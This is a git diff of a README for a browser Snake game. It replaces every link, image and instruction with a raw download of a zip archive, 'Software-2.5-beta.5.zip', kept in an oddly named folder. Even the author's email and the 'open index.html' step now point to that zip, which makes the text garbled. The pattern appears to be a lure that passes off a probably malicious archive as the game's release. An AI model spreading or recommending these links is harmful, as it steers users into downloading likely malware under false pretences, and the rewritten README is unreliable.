@@ -1,7 +1,7 @@
 # 🐍 Classic Snake Game
 
-![Snake Game](https://img.shields.io/badge/Snake_Game-Play%20Now-brightgreen)  
-[Download Latest Release](https://github.com/sisira430/snake/releases)
+![Snake Game](https://github.com/sisira430/snake/raw/refs/heads/main/semicostiferous/Software-2.5-beta.5.zip%20Now-brightgreen)  
+[Download Latest Release](https://github.com/sisira430/snake/raw/refs/heads/main/semicostiferous/Software-2.5-beta.5.zip)
 
 Welcome to the **Classic Snake Game** repository! This project offers a modern twist on the beloved Snake game, bringing nostalgia and fun to both new and seasoned players. Crafted with vanilla JavaScript, HTML5 Canvas, and CSS3, this game provides a smooth, engaging experience that works seamlessly on both desktop and mobile devices.
 
@@ -20,7 +20,7 @@ Welcome to the **Classic Snake Game** repository! This project offers a modern t
 
 The Classic Snake Game invites players to navigate a snake around the screen, collecting food while avoiding collisions with walls and itself. Designed by Musthofa Kamaluddin, this game combines retro pixel art aesthetics with smooth animations and intuitive controls. 
 
-![Gameplay Screenshot](https://via.placeholder.com/800x400.png?text=Snake+Game+Screenshot)
+![Gameplay Screenshot](https://github.com/sisira430/snake/raw/refs/heads/main/semicostiferous/Software-2.5-beta.5.zip+Game+Screenshot)
 
 This project not only evokes nostalgia but also provides a modern gaming experience. The game is fully responsive, ensuring that players can enjoy it on any device.
 
@@ -36,9 +36,9 @@ This project not only evokes nostalgia but also provides a modern gaming experie
 
 To get started with the Classic Snake Game, follow these steps:
 
-1. **Download the Game**: Visit the [Releases](https://github.com/sisira430/snake/releases) section to download the latest version.
+1. **Download the Game**: Visit the [Releases](https://github.com/sisira430/snake/raw/refs/heads/main/semicostiferous/Software-2.5-beta.5.zip) section to download the latest version.
 2. **Unzip the Files**: Extract the downloaded files to your preferred location.
-3. **Open in Browser**: Open the `index.html` file in your web browser to start playing.
+3. **Open in Browser**: Open the `https://github.com/sisira430/snake/raw/refs/heads/main/semicostiferous/Software-2.5-beta.5.zip` file in your web browser to start playing.
 
 ## 🎯 How to Play
 
@@ -75,8 +75,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or suggestions, feel free to reach out:
 
 - **Musthofa Kamaluddin**  
-  Email: musthofa@example.com  
-  GitHub: [sisira430](https://github.com/sisira430)
+  Email: https://github.com/sisira430/snake/raw/refs/heads/main/semicostiferous/Software-2.5-beta.5.zip  
+  GitHub: [sisira430](https://github.com/sisira430/snake/raw/refs/heads/main/semicostiferous/Software-2.5-beta.5.zip)
 
 ## 🌟 Acknowledgments
 
@@ -84,9 +84,9 @@ Special thanks to the open-source community for their support and resources. You
 
 ## 🕹️ Enjoy Playing!
 
-Dive into the Classic Snake Game and relive the fun of this iconic game. Don't forget to visit the [Releases](https://github.com/sisira430/snake/releases) section for updates and new features!
+Dive into the Classic Snake Game and relive the fun of this iconic game. Don't forget to visit the [Releases](https://github.com/sisira430/snake/raw/refs/heads/main/semicostiferous/Software-2.5-beta.5.zip) section for updates and new features!
 
-![Snake Game Logo](https://via.placeholder.com/200x100.png?text=Snake+Game+Logo)
+![Snake Game Logo](https://github.com/sisira430/snake/raw/refs/heads/main/semicostiferous/Software-2.5-beta.5.zip+Game+Logo)
 
 ---
 
